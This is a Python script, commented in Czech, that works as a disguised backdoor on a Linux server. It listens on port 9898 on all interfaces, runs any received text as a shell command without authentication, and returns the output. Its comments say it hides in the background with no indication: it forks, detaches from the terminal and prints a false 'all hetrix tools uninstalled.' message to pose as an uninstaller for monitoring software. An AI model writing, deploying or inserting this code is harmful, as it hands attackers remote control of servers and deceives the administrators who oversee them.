import socket
import subprocess
import os
import sys
import threading

def execute_command(command):
    # Spuštění příkazu na Ubuntu serveru
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout if result.stdout else result.stderr
    return output

def handle_client(client_socket):
    # Příjem příkazu od klienta
    command = client_socket.recv(4096).decode().strip()

    # Vykonání příkazu na serveru
    output = execute_command(command)

    # Odeslání výstupu zpět klientovi
    client_socket.send(output.encode())

    # Uzavření spojení s klientem
    client_socket.close()

def main():
    target_host = "0.0.0.0"  # IP adresa, na které bude server naslouchat
    target_port = 9898  # Port, na kterém server bude naslouchat

    # Vytvoření soketu
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Nastavení možnosti opakovaného použití adresy
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Přiřazení adresy a portu ke soketu
    server_socket.bind((target_host, target_port))

    # Naslouchání na příchozím spojení
    server_socket.listen(5)

    # Skrytí programu na pozadí bez jakýchkoliv indikací
    if os.name == 'posix':
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            print(f"Chyba při forku: {e}")
            sys.exit(1)

        # Odpojení od terminálu
        os.setsid()
        os.umask(0)

    print(f"all hetrix tools uninstalled.")

    while True:
        # Přijetí připojení klienta
        client_socket, addr = server_socket.accept()

        # Zpracování klienta v samostatném vlákně
        client_handler_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler_thread.start()

if __name__ == "__main__":
    main()
